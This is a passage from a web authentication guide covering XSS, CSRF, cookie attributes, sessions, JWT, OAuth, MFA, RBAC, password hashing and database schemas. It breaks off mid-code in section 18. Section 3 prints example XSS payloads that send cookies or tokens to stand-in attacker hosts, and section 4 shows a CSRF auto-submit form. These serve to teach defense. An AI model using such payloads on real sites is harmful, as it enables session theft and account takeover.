---
description: "A beginner-to-advanced guide to web authentication: XSS, CSRF, cookies, sessions, JWT, OAuth, MFA and RBAC, with full Hono, Express and Fastify implementations."
date: 2026-09-12
keywords: [authentication, security, cookies, jwt, oauth, rbac, hono, express]
featured: true
---

# The Complete Guide to Web Authentication

A beginner-to-advanced, end-to-end reference on authentication and authorization for web applications: how attacks like XSS work against auth systems, every cookie attribute and method you need to know, every major auth strategy, and full production-grade implementations in **Hono**, **Express**, and **Fastify** — using a repository pattern backed by **PostgreSQL** and **MySQL**.

Stack conventions used throughout: TypeScript (strict), Node/Bun runtime, Zod for validation, `bcrypt`/`argon2` for hashing, `jsonwebtoken` for JWTs, raw SQL via `pg`/`mysql2` behind a repository interface (swap in Prisma/Drizzle if you prefer an ORM — the auth logic stays the same).

---

## Table of Contents

**Part 1 — Foundations**

1. [Authentication vs Authorization](#1-authentication-vs-authorization)
2. [How a Login Actually Works (End-to-End Flow)](#2-how-a-login-actually-works-end-to-end-flow)

**Part 2 — Attacks You Must Understand**.

3. [XSS (Cross-Site Scripting) Attacks](#3-xss-cross-site-scripting-attacks)
4. [CSRF (Cross-Site Request Forgery)](#4-csrf-cross-site-request-forgery)
5. [Other Auth-Adjacent Attacks](#5-other-auth-adjacent-attacks)

**Part 3 — Cookies, In Depth**

6. [Every Cookie Attribute Explained](#6-every-cookie-attribute-explained)
7. [Cookie Methods & Patterns (Signed, Prefixed, Chunked)](#7-cookie-methods--patterns-signed-prefixed-chunked)

**Part 4 — Authentication Strategies**

8. [Session-Based Authentication](#8-session-based-authentication)
9. [Token-Based Authentication (JWT)](#9-token-based-authentication-jwt)
10. [Refresh Token Rotation](#10-refresh-token-rotation)
11. [OAuth 2.0 / OpenID Connect (Social Login)](#11-oauth-20--openid-connect-social-login)
12. [Passwordless & Magic Links](#12-passwordless--magic-links)
13. [Multi-Factor Authentication (MFA/2FA)](#13-multi-factor-authentication-mfa2fa)

**Part 5 — Authorization** 14.
[RBAC, Permissions, and Resource Ownership](#14-rbac-permissions-and-resource-ownership)

**Part 6 — Core Security Mechanics**

15. [Password Hashing Done Right](#15-password-hashing-done-right)
16. [Rate Limiting & Brute-Force Protection](#16-rate-limiting--brute-force-protection)
17. [Where to Store Tokens: The Real Answer](#17-where-to-store-tokens-the-real-answer)

**Part 7 — Full Implementations**

18. [Repository Pattern for Postgres & MySQL](#18-repository-pattern-for-postgres--mysql)
19. [Full Implementation in Express](#19-full-implementation-in-express)
20. [Full Implementation in Fastify](#20-full-implementation-in-fastify)
21. [Full Implementation in Hono](#21-full-implementation-in-hono)

**Part 8 — Wrap-Up**

22. [Production Security Checklist](#22-production-security-checklist)
23. [Common Pitfalls Reference Table](#23-common-pitfalls-reference-table)

---

## 1. Authentication vs Authorization

These two words get used interchangeably by beginners, but they solve completely different problems.

|                     | Authentication (AuthN)                        | Authorization (AuthZ)                              |
| ------------------- | --------------------------------------------- | -------------------------------------------------- |
| Question it answers | "Who are you?"                                | "What are you allowed to do?"                      |
| Happens             | Once, at login (then re-verified per request) | On every protected action                          |
| Result              | An identity (a `userId`)                      | A yes/no decision                                  |
| Examples            | Password login, OAuth, MFA, magic link        | RBAC roles, permissions, resource ownership checks |

A request can be **authenticated** (we know it's user #42) but still **unauthorized** (user #42 isn't an admin, so they can't delete another user's post). Every protected route in this guide performs both checks, in that order: authenticate first, authorize second.

---

## 2. How a Login Actually Works (End-to-End Flow)

Before diving into attacks and cookies, it helps to see the whole picture in one flow:

1. **User submits credentials** (email + password) over HTTPS to `/auth/login`.
2. **Server looks up the user** by email in the database.
3. **Server verifies the password** against the stored hash (never a plaintext comparison).
4. **Server creates a credential** — either:
   - a **session row** in the database/Redis + a random session ID sent as a cookie, or
   - a **signed JWT** containing the user's identity, sent as a cookie or JSON body.
5. **Server sets the credential in an `httpOnly` cookie** (the secure default) so client-side JavaScript can never read it.
6. **Browser automatically attaches the cookie** on every subsequent request to that domain.
7. **Middleware on protected routes** reads the cookie, verifies the session/JWT, and attaches `req.user` (or `c.set('user', ...)` in Hono) before the route handler runs.
8. **Authorization middleware** then checks roles/permissions/ownership before allowing the action.
9. **Logout** destroys the session server-side (session auth) or the client discards the cookie and the server blacklists/rotates the refresh token (JWT auth).

Everything below is a deep dive into each of these steps — and, critically, everything that can go wrong at each step.

---

## 3. XSS (Cross-Site Scripting) Attacks

### 3.1 What XSS actually is

XSS happens when an attacker manages to get **their own JavaScript to execute inside your website's origin**, in your users' browsers. Because the malicious script runs _as if it were your site's own code_, it has access to anything your site's legitimate JS has access to — the DOM, `localStorage`, `sessionStorage`, and (critically) any cookies that are **not** marked `httpOnly`.

The core danger for authentication: if your access token or session ID is readable by JavaScript, one successful XSS payload anywhere on your domain is enough for an attacker to steal it and impersonate the user — no password needed.

### 3.2 The three types of XSS

**1. Stored XSS (persistent)** — the most dangerous type. The malicious script is saved on the server (e.g. inside a comment, a username, a profile bio) and served to every user who views that content.

```
Comment box input: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

If comments are rendered without escaping, every visitor's browser runs this and exfiltrates their cookies (if the cookies aren't `httpOnly`).

**2. Reflected XSS (non-persistent)** — the payload comes from the current request (typically a URL query parameter) and is immediately reflected back into the HTML response without sanitization. Attackers deliver this via a crafted link sent over email/chat.

```
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**3. DOM-based XSS** — the vulnerability lives entirely in client-side JavaScript. The page's own script takes untrusted input (URL hash, `window.location`, a `postMessage` payload) and unsafely inserts it into the DOM via `innerHTML`, `document.write`, or similar, without ever going through the server.

```javascript
// Vulnerable client-side code
document.getElementById("welcome").innerHTML =
  "Hello " + new URLSearchParams(location.search).get("name");
// URL: /?name=<img src=x onerror=alert(document.cookie)>
```

### 3.3 What an XSS payload does to steal auth

A real attack payload rarely uses `alert()` — that's just the classroom demo. A real payload silently exfiltrates data:

```javascript
// Steal readable cookies and send them to an attacker-controlled server
fetch("https://attacker.com/collect", {
  method: "POST",
  body: document.cookie,
});

// Or steal a JWT sitting in localStorage
fetch("https://attacker.com/collect", {
  method: "POST",
  body: localStorage.getItem("accessToken"),
});

// Or make an authenticated request on the victim's behalf right there in their session
fetch("/api/account/change-email", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "attacker@evil.com" }),
});
```

Notice: `document.cookie` **only returns cookies that are not `httpOnly`**. This is the single most important fact in this whole guide — repeated in Section 6.

### 3.4 How to actually prevent XSS

XSS prevention is defense-in-depth; no single layer is sufficient alone.

1. **Escape/encode all output.** Never insert untrusted data into HTML without escaping. Modern frameworks (React, Vue, Next.js) escape by default when you use `{value}`/`{{ value }}` — the danger is explicitly opting out via `dangerouslySetInnerHTML`, `v-html`, or raw `innerHTML`.
2. **Never build HTML via string concatenation** on the server with unsanitized user input.
3. **Sanitize any HTML you must render** (e.g. rich-text/comment bodies) with a library like `DOMPurify` — allowlist safe tags/attributes, strip everything else (especially `<script>`, `on*` event handlers, `javascript:` URLs).
4. **Set a Content-Security-Policy (CSP) header.** This is your safety net if an escaping bug slips through:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<random-per-request>'; object-src 'none'; base-uri 'self';
   ```
   A strict CSP without `'unsafe-inline'` means even an injected `<script>` tag simply won't execute.
5. **Mark auth cookies `httpOnly`.** Even if an XSS bug exists, JavaScript can't read an `httpOnly` cookie, so the session/JWT can't be exfiltrated via `document.cookie`. (It can _still_ be used to make same-origin requests on the victim's behalf while they're on the page — CSP + short token lifetimes mitigate this further.)
6. **Validate and encode on input AND output.** Input validation (e.g. rejecting `<script>` in a username field with Zod) reduces attack surface, but output encoding is the layer that actually prevents execution — never rely on input validation alone.
7. **Use `X-Content-Type-Options: nosniff`** to stop browsers from MIME-sniffing a file into executable script.
8. **Avoid `eval()`, `new Function()`, and untrusted `innerHTML`/`document.write`** entirely in your own code.

---

## 4. CSRF (Cross-Site Request Forgery)

XSS steals credentials; CSRF **abuses credentials that are already there**, without ever reading them. Because browsers automatically attach cookies to requests, a malicious site can trick a logged-in user's browser into firing a request to your site — and the browser happily includes the session cookie.

```html
<!-- Hosted on evil.com, visited by a user who is logged into bank.com -->
<form action="https://bank.com/api/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.getElementById("f").submit();
</script>
```

If `bank.com` only checks "is there a valid session cookie?", this succeeds — the browser attaches the real cookie automatically.

### CSRF defenses

1. **`SameSite=Lax` or `SameSite=Strict` cookies** (covered fully in Section 6) is the single most effective modern defense — it stops the browser from sending the cookie on cross-site requests in the first place.
2. **CSRF tokens (synchronizer token pattern):** the server embeds a random token in the page/form; the client must send it back in a header or hidden field on state-changing requests; the server rejects requests where it's missing/mismatched. Necessary for `SameSite=None` cases (e.g. legitimate cross-site embedding) or as defense-in-depth.
3. **Double-submit cookie pattern:** a CSRF token is set as a _readable_ (non-httpOnly) cookie and must also be echoed back in a custom request header (e.g. `X-CSRF-Token`). Since cross-origin JS can't read another site's cookies, an attacker's page can't reproduce the header — even though the cookie itself would be auto-attached.
4. **Check the `Origin`/`Referer` header** on state-changing requests as an additional server-side check.
5. **Pure token-based auth (Bearer JWT in an `Authorization` header, not a cookie) is naturally immune to classic CSRF**, because the browser doesn't auto-attach `Authorization` headers — the client JS must explicitly add it. This is the main auth-architecture trade-off discussed in Section 17.

---

## 5. Other Auth-Adjacent Attacks

- **Session fixation:** an attacker sets/knows a session ID before login and tricks the victim into authenticating with it. Defense: always **regenerate the session ID after a successful login** (never reuse a pre-auth session ID post-auth).
- **Brute force / credential stuffing:** automated password guessing, often using leaked credential lists. Defense: rate limiting (Section 16), account lockout with exponential backoff, CAPTCHA after N failures, and breach-password checks (e.g. via the HaveIBeenPwned k-anonymity API).
- **Token replay:** a stolen valid token is reused after it should no longer be valid. Defense: short-lived access tokens, refresh token rotation with reuse detection (Section 10), and the ability to revoke sessions server-side.
- **Open redirect in OAuth callbacks:** an attacker manipulates the OAuth `redirect_uri`/`state` to hijack the auth code. Defense: strict allowlisting of redirect URIs and validating the `state` parameter (Section 11).
- **Timing attacks on login:** returning "user not found" faster than "wrong password" leaks which emails are registered. Defense: constant-time comparison (bcrypt/argon2 already do this) and identical response timing/messaging for both cases ("Invalid email or password").
- **Clickjacking on auth forms:** embedding your login/consent page in an invisible iframe to trick clicks. Defense: `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.

---

## 6. Every Cookie Attribute Explained

A cookie is just a `Set-Cookie` response header. Every attribute after the first `name=value` pair is a flag controlling how the browser stores and sends it back. Getting these wrong is the #1 cause of real-world auth vulnerabilities.

```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400; Domain=example.com
```

### `HttpOnly`

**The single most important auth cookie flag.** Makes the cookie invisible to `document.cookie` and any JavaScript — only the browser's own HTTP layer can read/send it. This is your primary defense against XSS-based token theft (Section 3.3). **Every session/auth cookie should have this flag. There is almost never a legitimate reason to omit it for an auth cookie.**

```typescript
res.cookie("session_id", sessionId, { httpOnly: true });
```

### `Secure`

The cookie is only ever sent over HTTPS — never plain HTTP. This stops network-level eavesdroppers (e.g. on public WiFi, or a malicious intermediary) from intercepting the cookie in transit. **Always set this in production.** (It's fine to omit on `localhost` during development since browsers treat `localhost` as a secure context anyway, but many teams just gate it on `NODE_ENV`.)

```typescript
secure: process.env.NODE_ENV === "production";
```

### `SameSite`

Controls whether the cookie is sent on cross-site requests — this is your primary CSRF defense (Section 4).

| Value                              | Sent on same-site requests? | Sent on cross-site navigation (top-level link)? | Sent on cross-site `<img>`/`fetch`/`<form>`? |
| ---------------------------------- | --------------------------- | ----------------------------------------------- | -------------------------------------------- |
| `Strict`                           | Yes                         | **No**                                          | No                                           |
| `Lax` (default in modern browsers) | Yes                         | Yes                                             | No                                           |
| `None`                             | Yes                         | Yes                                             | Yes (requires `Secure`)                      |

- **`Strict`** — safest, but even clicking a link from an email/another site to your logged-in app won't carry the cookie (user briefly appears logged out until they navigate again). Best for highly sensitive actions (banking).
- **`Lax`** — the sensible default for most apps: top-level GET navigations still work (so a shared link opens logged in), but the cookie is withheld on cross-site POSTs, image loads, and fetches — blocking the classic CSRF form-submit attack.
- **`None`** — required only when you intentionally need the cookie sent cross-site (e.g. a third-party embedded widget or a separate API subdomain used via `<iframe>`). Must be paired with `Secure`, and you should add CSRF tokens as well since `SameSite` protection is fully disabled.

```typescript
sameSite: "lax"; // or "strict" for max security, "none" for cross-site embeds
```

### `Domain`

Which host(s) the cookie is sent to.

- **Omitted (default):** cookie is scoped to the _exact_ host that set it (not subdomains) — the safest default.
- **Explicitly set** (e.g. `Domain=example.com`): the cookie is sent to `example.com` **and all subdomains** (`api.example.com`, `admin.example.com`, etc.). Only set this if you deliberately need cross-subdomain auth (e.g. SSO across `app.example.com` and `admin.example.com`) — it widens your attack surface, since a vulnerability on _any_ subdomain can potentially read/tamper with the cookie's presence.

### `Path`

Restricts the cookie to a URL path prefix (default `/`, i.e. the whole site). Rarely used for auth cookies beyond the default, but occasionally used to scope an admin session cookie to `/admin` only.

### `Max-Age` / `Expires`

Controls cookie lifetime.

- **`Max-Age=N`** (seconds) — modern, relative, preferred.
- **`Expires=<date>`** — legacy, absolute timestamp, needed for very old browser support.
- **Omitting both** creates a **session cookie** — deleted when the browser closes (not the same thing as your server-side "session" concept; naming collision that confuses beginners constantly).

For auth: short `Max-Age` for access-token cookies (minutes), longer for refresh-token cookies (days), and the _server-side_ session/refresh-token record should have its own independent expiry that's checked regardless of what the cookie claims.

### `Partitioned` (CHIPS)

A newer attribute that partitions a cookie per top-level site when used in a third-party/embedded context, so a cookie set by an embedded widget on `site-a.com` isn't shared when that same embed appears on `site-b.com`. Relevant if you build embeddable widgets; not typically needed for standard first-party auth.

## 7. Cookie Methods & Patterns (Signed, Prefixed, Chunked)

### 7.1 Signed cookies

A signed cookie has an HMAC signature appended server-side, so the server can detect if the client tampered with the value — without needing to store the value server-side at all. Useful for lightweight, stateless flags (e.g. `theme=dark.signature`), but for **auth**, prefer either:

- an opaque random session ID that maps to server-side state (session auth), or
- a JWT, which is itself signed and self-verifying (token auth).

Express example via `cookie-parser`:

```typescript
app.use(cookieParser(process.env.COOKIE_SECRET));
res.cookie("flag", "value", { signed: true });
// req.signedCookies.flag on the way back; tampering invalidates it
```

### 7.2 Cookie name prefixes: `__Host-` and `__Secure-`

Browser-enforced naming conventions that add hard guarantees beyond what a developer might forget to set manually:

- **`__Secure-` prefix:** the cookie _must_ have `Secure` set, or the browser refuses to store it.
- **`__Host-` prefix:** _must_ have `Secure`, _must not_ have a `Domain` attribute (host-only), and _must_ have `Path=/`. This is the strongest guarantee available — it's cryptographically difficult for anything but the exact origin to have ever set this cookie, defending against subdomain-based cookie injection attacks.

```typescript
res.cookie("__Host-session", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  path: "/",
  // no `domain` — required for __Host- to be valid
});
```

Recommended for your main session cookie in any security-conscious app.

### 7.3 Cookie size limits & chunking

Browsers cap individual cookies around 4KB and the total per-domain around ~50-180 cookies/~4KB each depending on browser. A JWT with many claims can approach this limit. If you hit it: strip unnecessary claims from the JWT (keep it to `userId`, `role`, `iat`, `exp` — look up everything else server-side), or split large data across multiple cookies ("chunking") — but this is a sign you should probably switch that data to server-side session storage instead.

### 7.4 Reading/writing cookies per framework (quick reference)

```typescript
// Express (with cookie-parser)
res.cookie("token", value, { httpOnly: true, secure: true, sameSite: "lax" });
const token = req.cookies.token;

// Fastify (with @fastify/cookie)
reply.setCookie("token", value, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
});
const token = request.cookies.token;

// Hono (built-in cookie helper)
import { setCookie, getCookie } from "hono/cookie";
setCookie(c, "token", value, { httpOnly: true, secure: true, sameSite: "Lax" });
const token = getCookie(c, "token");
```

---

## 8. Session-Based Authentication

**How it works:** on login, the server creates a session record (in Postgres/MySQL/Redis) containing the `userId` and metadata, generates a random opaque session ID, and sends it to the browser as an `httpOnly` cookie. On every request, the server looks up that ID in storage to identify the user.

**Characteristics:**

- **Stateful** — the server (or a shared store like Redis) must hold session data. This means you need shared/centralized session storage across multiple server instances (can't just keep sessions in server memory once you scale horizontally).
- **Instantly revocable** — delete the session row and the user is logged out immediately, everywhere that session was valid. This is the biggest practical advantage over JWT.
- **Simple mental model** — the cookie holds no meaningful data itself, just a lookup key.
- **Cookie-only** — doesn't naturally extend to mobile apps or third-party API consumers who can't rely on browser cookie jars (though it can be adapted with an `Authorization: Bearer <sessionId>` fallback).

**When to choose it:** traditional server-rendered web apps, apps that need instant "log out everywhere" / admin-forced logout, and apps where you're not also serving a separate mobile client or public API.

## 9. Token-Based Authentication (JWT)

**How it works:** on login, the server creates a **JSON Web Token** — a signed (not necessarily encrypted) blob of claims (`userId`, `role`, `exp`, etc.) structured as `header.payload.signature`. The server never stores it; anyone holding a valid signature-verified token is trusted as that user until it expires.

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcwMDAwMDAwMH0.4f8a...
   (header: alg)         (payload: claims — readable by anyone, NOT encrypted)         (signature)
```

**Critical misconception to correct:** a JWT's payload is **base64-encoded, not encrypted** — anyone can decode and read it (try it on jwt.io). The signature only proves it wasn't _tampered with_; it does not hide the contents. **Never put secrets/passwords in a JWT payload.**

**Characteristics:**

- **Stateless** — any server that knows the signing secret can verify the token without a database lookup, which scales horizontally with zero shared state.
- **Hard to revoke** — because there's no server-side record, a JWT is valid until it naturally expires, even if you "log the user out" client-side. This is JWT's biggest weakness, solved in practice by: short expiry (15 min) + a refresh-token system (Section 10) + an optional server-side blacklist for emergency revocation.
- **Self-contained** — the payload can carry role/permissions, avoiding a DB round-trip on every request (trade-off: if a role changes mid-token-lifetime, the old token still reflects the old role until it expires).

**When to choose it:** APIs consumed by multiple clients (web + mobile + third-party), microservice architectures where services need to verify identity without a shared session store, or when you specifically need stateless horizontal scaling.

```typescript
import jwt from "jsonwebtoken";

const accessToken = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET!,
  { expiresIn: "15m", issuer: "myapp", audience: "myapp-users" },
);

const payload = jwt.verify(accessToken, process.env.JWT_SECRET!, {
  issuer: "myapp",
  audience: "myapp-users",
}); // throws on invalid signature, expiry, issuer, or audience mismatch
```

> **Session vs JWT is not really "old vs new."** Sessions are simpler and instantly revocable but require shared storage; JWTs are stateless but harder to revoke early. Many production systems use a **hybrid**: a short-lived JWT access token for fast verification, backed by a server-side refresh token record (Section 10) that gives you back the revocability of sessions where it matters most.

## 10. Refresh Token Rotation

Short-lived access tokens (15 min) are safer but mean the user would need to re-login every 15 minutes without a refresh mechanism. A **refresh token** is a long-lived (days/weeks) credential, stored server-side (hashed, like a password) and sent as an `httpOnly` cookie, used _only_ to mint new access tokens — it's never sent on regular API requests.

**Rotation with reuse detection (the production-grade version):**

1. On login, issue `accessToken` (15 min) + `refreshToken` (7 days). Store a _hash_ of the refresh token in the DB, tied to `userId` + a device/session identifier.
2. On `/auth/refresh`, verify the incoming refresh token against the stored hash, then **issue a brand-new refresh token and invalidate the old one** — every refresh rotates the token.
3. **Reuse detection:** if an _already-invalidated_ refresh token is presented again, that's a signal it was stolen and used by both the attacker and the legitimate user — immediately revoke **all** refresh tokens for that user and force a fresh login everywhere.
4. Logout deletes the current refresh token record; "log out all devices" deletes every refresh token record for that `userId`.

This gives JWT-based auth the same "instantly revocable, detect theft" properties that session auth has natively, at the cost of a DB write per refresh (roughly the same cost as a session lookup — the two strategies converge more than people think).

## 11. OAuth 2.0 / OpenID Connect (Social Login)

OAuth 2.0 is an **authorization** delegation protocol ("let this app act on my behalf with Google") — it wasn't originally designed for authentication. **OpenID Connect (OIDC)** is a thin identity layer built on top of OAuth 2.0 that adds a standardized `id_token` (a JWT) specifically for "who is this user," which is why almost all "Sign in with Google/GitHub" flows are actually OIDC under the hood.

**Authorization Code flow (the one you should use for a web app):**

1. Your app redirects the user to the provider (`https://accounts.google.com/o/oauth2/auth?client_id=...&redirect_uri=...&scope=openid email profile&state=<random>`).
2. User authenticates with Google/GitHub directly (your app never sees their Google password).
3. Provider redirects back to your `redirect_uri` with a short-lived `code` and the same `state` you sent.
4. **Your server** (never the browser) exchanges that `code` + your `client_secret` for tokens via a direct server-to-server request to the provider.
5. You receive an `id_token` (OIDC — who they are) and optionally an `access_token` (to call the provider's API on their behalf).
6. Look up or create a local user record keyed by the provider's stable user ID, then issue **your own** session/JWT exactly as you would for a password login — the OAuth tokens don't need to be relied upon for ongoing auth to your own app.

**Non-negotiable security details:**

- **Always validate `state`** — a random value your server generated before the redirect, checked on callback, to prevent CSRF against the OAuth flow itself.
- **Use PKCE** (Proof Key for Code Exchange) even for confidential (server-side) clients — it's now recommended universally, and mandatory for public clients (SPAs, mobile apps) since they can't safely hold a `client_secret`.
- **Strictly allowlist `redirect_uri` values** in the provider's dashboard — an attacker-controlled redirect URI is a classic account-takeover vector.

## 12. Passwordless & Magic Links

Instead of a password, the user proves identity by clicking a one-time link sent to their verified email:

1. User submits their email.
2. Server generates a random, single-use token, stores its hash with a short expiry (10–15 min), and emails a link like `https://app.com/auth/verify?token=<raw-token>`.
3. Clicking the link hits your server, which hashes the incoming token, compares it to the stored hash, checks expiry, and — if valid — logs the user in (issues a session/JWT) and immediately invalidates the token (single use).

**Security must-haves:** short expiry, single-use (delete/mark-used immediately), rate-limit link requests per email to prevent spam/enumeration, and use a cryptographically random token (`crypto.randomBytes(32)`), never a predictable value.

## 13. Multi-Factor Authentication (MFA/2FA)

Adds a second independent proof of identity beyond the password — "something you know" (password) + "something you have" (a device/app).

**TOTP (Time-based One-Time Password) — the standard approach (Google Authenticator, Authy, 1Password):**

1. On enabling MFA, generate a random secret, store it (encrypted) against the user, and show it as a QR code (`otpauth://totp/MyApp:user@email.com?secret=...&issuer=MyApp`).
2. User scans it into their authenticator app, which generates a new 6-digit code every 30 seconds from that shared secret.
3. On login, after password verification succeeds, prompt for the current 6-digit code and verify it server-side using the same shared secret and algorithm (`speakeasy` or `otpauth` libraries in Node).
4. Provide single-use **backup codes** generated at setup time, for account recovery if the device is lost.

**Enforcing MFA in the login flow:** don't issue the final session/access token after step 1 (password) alone — issue a short-lived, limited-scope "pending MFA" token that's only valid for hitting the `/auth/mfa/verify` endpoint, and only issue the real session/access token after that second factor succeeds.

---

## 14. RBAC, Permissions, and Resource Ownership

Authorization typically layers three complementary checks:

**1. Role-Based Access Control (RBAC)** — the coarsest layer. Every user has one or more roles (`user`, `moderator`, `admin`); routes require a minimum role.

**2. Permission-Based Access Control** — finer-grained than roles: instead of checking "is this an admin?", check "does this role include the `delete:users` permission?" This decouples routes from specific role names, so adding a new role (e.g. `support-agent`) doesn't require touching every route — just defining its permission set.

**3. Resource ownership (a.k.a. ABAC-lite)** — even with the right role/permission, a user should typically only modify _their own_ resources unless they're an admin. This is checked by comparing `resource.ownerId === req.user.userId` on the specific record being accessed, not just the route in general.

**4. Attribute-Based Access Control (ABAC)** — the most flexible/complex model: decisions consider arbitrary attributes of the user, resource, and context together (e.g. "finance-team members can approve invoices under $10,000, but only during business hours, and only for their own department"). Reach for this only when RBAC + ownership genuinely isn't expressive enough — it adds real complexity.

**Rule of thumb:** start with RBAC + ownership checks (covers ~90% of apps). Add permission-based checks when roles start multiplying awkwardly. Only reach for full ABAC/policy engines (e.g. OPA, Cedar, CASL) at genuine enterprise scale with complex compliance requirements.

## 15. Password Hashing Done Right

**Never store plaintext passwords. Never use a fast general-purpose hash like MD5/SHA-256 alone** — these are designed to be _fast_, which is exactly wrong for passwords (it makes brute-forcing a stolen hash database cheap). Use a hashing algorithm specifically designed to be _slow and memory-hard_:

- **`bcrypt`** — battle-tested, widely supported, cost factor (`saltRounds`) tunable (10–12 is a reasonable default in 2026 hardware terms).
- **`argon2`** (specifically `argon2id`) — the current recommended default for new systems; winner of the Password Hashing Competition, resistant to both GPU-cracking and side-channel/timing attacks, tunable for memory + time cost.

```typescript
import argon2 from "argon2";

async function hashPassword(password: string): Promise<string> {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 19456,
    timeCost: 2,
    parallelism: 1,
  });
}

async function verifyPassword(
  hash: string,
  password: string,
): Promise<boolean> {
  return argon2.verify(hash, password);
}
```

**Salting is automatic and per-hash** in both bcrypt and argon2 — you never manage salts manually; the salt is embedded in the resulting hash string itself.

**Password policy:** enforce a reasonable minimum length (12+ characters is stronger guidance than complex character-class rules, per current NIST guidance), check against known-breached password lists (HaveIBeenPwned's k-anonymity range API lets you check without ever sending the full password/hash), and avoid arbitrary maximum lengths or forced periodic rotation (both are outdated practices that push users toward weaker, predictable passwords).

## 16. Rate Limiting & Brute-Force Protection

Auth endpoints (`/login`, `/register`, `/forgot-password`, `/mfa/verify`) are the most attacked endpoints in any app — they must be rate-limited independently and more aggressively than general API routes.

```typescript
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Too many login attempts, please try again later" },
});

app.post("/auth/login", loginLimiter, loginHandler);
```

Layer this with:

- **Per-account lockout** (not just per-IP — an attacker can rotate IPs but not the target account) with exponential backoff after repeated failures.
- **CAPTCHA** after N failed attempts, to filter automated attempts specifically.
- **Distributed store (Redis)** for the rate-limit counters once you run multiple server instances — an in-memory limiter resets per-instance and is trivially bypassed by load-balanced traffic.

## 17. Where to Store Tokens: The Real Answer

This is the single most-debated topic in web auth, and the nuance matters more than the sound-bite.

| Storage                                                            | Vulnerable to XSS?                                                                                             | Vulnerable to CSRF?             | Works cross-origin (mobile/3rd-party API)? |
| ------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------- | ------------------------------- | ------------------------------------------ |
| `localStorage` / `sessionStorage`                                  | **Yes** — fully readable by any JS on the page                                                                 | No (not auto-sent)              | Yes                                        |
| Cookie, **not** `httpOnly`                                         | **Yes**                                                                                                        | Yes (unless SameSite mitigates) | Limited                                    |
| Cookie, `httpOnly` + `Secure` + `SameSite=Lax`                     | **No** — invisible to JS                                                                                       | Largely mitigated by SameSite   | Browser-only                               |
| `Authorization: Bearer` header (JWT held in memory, not persisted) | Only if XSS reads it from wherever it's held in memory — safer than localStorage if never persisted to storage | No (not auto-attached)          | Yes                                        |

**The practical, current best-practice recommendation:**

- **For a standard web app (server-rendered or SPA served from your own domain):** use an `httpOnly`, `Secure`, `SameSite=Lax` cookie for the session/refresh token. This is immune to XSS-based theft (JS can't read it) and largely immune to CSRF (SameSite blocks cross-site auto-attachment).
- **For a public API consumed by mobile apps / third-party developers:** use `Authorization: Bearer <JWT>` headers, since there's no browser cookie jar involved and CSRF isn't applicable to non-browser clients. Keep the token in memory on the client, not `localStorage`, where possible.
- **Never** put a long-lived, high-privilege token in `localStorage` "for convenience" — this trades a well-understood, mitigable cookie-CSRF risk for an unmitigated XSS-theft risk, which is strictly worse in practice, since a single XSS bug anywhere on the page grants full account takeover with no additional defense layer available.

---

## 18. Repository Pattern for Postgres & MySQL

The repository pattern keeps your auth logic (hashing, token issuing, session rules) completely decoupled from _which_ database you're on. Every framework implementation below (Hono/Express/Fastify) calls the same `UserRepository`/`SessionRepository`/`RefreshTokenRepository` interfaces — only the concrete implementation differs by driver.

### 18.1 Shared schema (works for both, minor type differences noted)

```sql
-- Postgres
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  role VARCHAR(50) NOT NULL DEFAULT 'user',
  mfa_secret TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE sessions (
  id TEXT PRIMARY KEY,               -- random opaque session id
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE refresh_tokens (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token_hash TEXT NOT NULL,
  revoked BOOLEAN NOT NULL DEFAULT false,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
```

```sql
-- MySQL (same shape, MySQL-flavored types)
CREATE TABLE users (
  id CHAR(36) PRIMARY KEY DEFAULT (UUID()),
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  role VARCHAR(50) NOT NULL DEFAULT 'user',
  mfa_secret TEXT,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE sessions (
  id VARCHAR(255) PRIMARY KEY,
  user_id CHAR(36) NOT NULL,
  expires_at DATETIME NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE TABLE refresh_tokens (
  id CHAR(36) PRIMARY KEY DEFAULT (UUID()),
  user_id CHAR(36) NOT NULL,
  token_hash TEXT NOT NULL,
  revoked BOOLEAN NOT NULL DEFAULT false,
  expires_at DATETIME NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
```

### 18.2 The shared interface (`repository.types.ts`)

```typescript
export interface User {
  id: string;
  email: string;
  passwordHash: string;
  role: string;
  mfaSecret: string | null;
  createdAt: Date;
}

export interface UserRepository {
